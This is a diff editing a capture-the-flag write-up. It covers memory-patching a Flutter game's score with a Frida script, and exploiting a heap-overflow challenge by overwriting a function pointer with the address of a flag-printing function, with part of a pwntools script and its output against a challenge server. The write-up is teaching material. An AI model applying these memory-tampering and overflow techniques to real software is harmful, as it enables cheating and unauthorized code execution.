@@ -756,7 +756,7 @@ To decompile the app we need to use blutter tool https://github.com/worawit/blut
 
 ```bash
 python blutter.py indir outdir
-python blutter.py /home/plaintext/Downloads/dinoflame/lib/arm64-v8a/ dinooo
+python blutter.py /dinoflame/lib/arm64-v8a/ dinooo
 ```
 
 The decompiled code will now be located at `dinoo/asm/dino_flame/`. Let's try and search for code related to score. We notice something of more interest `set _ currentScore` at `models/player_data.dart` line number `37` that seems to set the score.
@@ -822,14 +822,15 @@ We run the apk which reveals a dark screen. We use `objection explore` command t
 
 ![img-desc](7_8.png)
 
-next we load our script in the current directory with `evaluate blutter_frida.js` command inside objection. After playing the game for sometime we notice the value at `off_40` reflects the same value as the score. 
+next we load our script which is located in our current directory with `evaluate blutter_frida.js` command inside objection.
+After playing the game for sometime we notice the value at `off_40` reflects the same value as the score. 
 
 ![img-desc](7_10.png)
 
 So all we have to do is ovverwrite the value in memory at `off_40` to `2147483647` to pass the score. We modify our `blutter_frida.js` script to trigger that.
 
 ```js
-...
+   ...
 5  function onLibappLoaded() {
 6      const fn_addr = 0x29ce0c;
 7      Interceptor.attach(libapp.add(fn_addr), {
@@ -848,7 +849,7 @@ So all we have to do is ovverwrite the value in memory at `off_40` to `214748364
 23          }
 24      });
 25  }
-...
+    ...
 ```
 
 Running the app with the new code we finnally get our flag;
@@ -861,20 +862,94 @@ The flag was hardcoded in the game, allowing it to be retrieved easily without c
 ## Heap wars
 ![img-desc](8.png)
 
-```bash
-python exploit.py
-...
-[+] Opening connection to 94.72.112.248 on port 1337: Done
-[*] Switching to interactive mode
- Flag content:
-r00t{h34p_0v3rfl0w_1n_th3_f0rc3_1ebfe9e04a01ac4b00d4bd194b1bd505}Jedi code saved.
-====== Jedi Training Menu ======
-1. Enter your Jedi code
-2. Jedi data
-3. Jedi next bounty
-4. Exit
-Enter your choice: $
+Lets decompile the code in binary ninja. The code allocates dynamic memory of size`64` bytes in the heap for the `char* rax_2`.
+It also allocates `8` bytes for a function `int64_t (** rax_3)()` and initialy sets it to `darthVader`.
+
+```c
+004012f9  int32_t main(int32_t argc, char** argv, char** envp)
+              ....
+0040132f      char* rax_2 = malloc(bytes: 64)
+00401340      int64_t (** rax_3)() = malloc(bytes: 8)
+00401353      *rax_3 = darthVader
 ```
+
+```c
+00401287  int64_t darthVader()
+00401297      return puts(str: "You have not mastered the Force.")
+```
+
+The binary runs a while loop to allow user change different modes. The first mode `1. Enter your Jedi code` requires a user to 
+enter a code of size `256` bytes and copies it to `rax_2` which is of size `64` hence a buffer overflow. It also prints the function
+at `(*rax_3)()`
+
+```c
+            ....
+004013f8    else if (rax_8 == 1)
+00401424        printf(format: "Enter your Jedi code: ")
+00401429        getchar()
+0040144c        void buf
+0040144c                  
+0040144c        if (fgets(&buf, n: 256, fp: stdin) == 0)
+00401453            perror(s: "Error reading input")
+0040145d            exit(status: 1)
+0040145d            noreturn
+0040145d                  
+00401476        strcpy(rax_2, &buf)
+00401482        (*rax_3)()
+00401491        puts(str: "Jedi code saved.")
+00401496        continue
+            ....
+```
+
+the next option `2. Jedi data` prints a pointer to `rax_2` in the heap.
+
+```c
+            ...        
+0040140a    else if (rax_8 == 2)
+004014ac        printf(format: "Jedi data: %p\n", rax_2)
+004014b1        continue
+            ...
+```
+
+The other option `3. Jedi next bounty` prints a pointer to function `rax_3` in the heap.
+
+```c
+            ...
+004013e6    else
+004013f8        if (rax_8 == 3)
+004014c7            printf(format: "Jedi bounty: %p\n", rax_3)
+004014cc            continue
+            ...
+```
+
+We also have a function `theForce()` that prints the flag content.
+
+```c
+00401216  int64_t theForce()
+
+00401228      FILE* fp = fopen(filename: "flag.txt", mode: &data_402008)
+00401228      
+00401236      if (fp == 0)
+0040123d          perror(s: "Error opening flag.txt. Contact …")
+00401247          exit(status: 1)
+00401247          noreturn
+00401247      
+00401251      puts(str: "Flag content:")
+00401251      
+0040126a      while (true)
+0040126a          char rax_2 = fgetc(fp)
+0040126a          
+00401276          if (rax_2 == 0xff)
+00401276              break
+00401276          
+0040125e          putchar(c: sx.d(rax_2))
+0040125e      
+00401286      return fclose(fp)
+```
+
+Finally what we have to do is calculate the distance between `rax_2` and `rax_3` then overwrite `rax_3` with the address of 
+`theForce()` function using the buffer overflow. Since the pointers are leaked all we have to do is 
+`int_function_address - int_data_address` to get the offset.
 
 ```python
 from pwn import *
@@ -912,4 +987,17 @@ p.recvuntil(b'Enter your Jedi code:')
 p.sendline(payload)
 
 p.interactive()
+```
+
+Finally we run our exploit and get the flag.
+
+```bash
+python exploit.py
+...
+[+] Opening connection to 94.72.112.248 on port 1337: Done
+[*] Switching to interactive mode
+ Flag content:
+r00t{h34p_0v3rfl0w_1n_th3_f0rc3_1ebfe9e04a01ac4b00d4bd194b1bd505}Jedi code saved.
+...
+Enter your choice: $
 ```
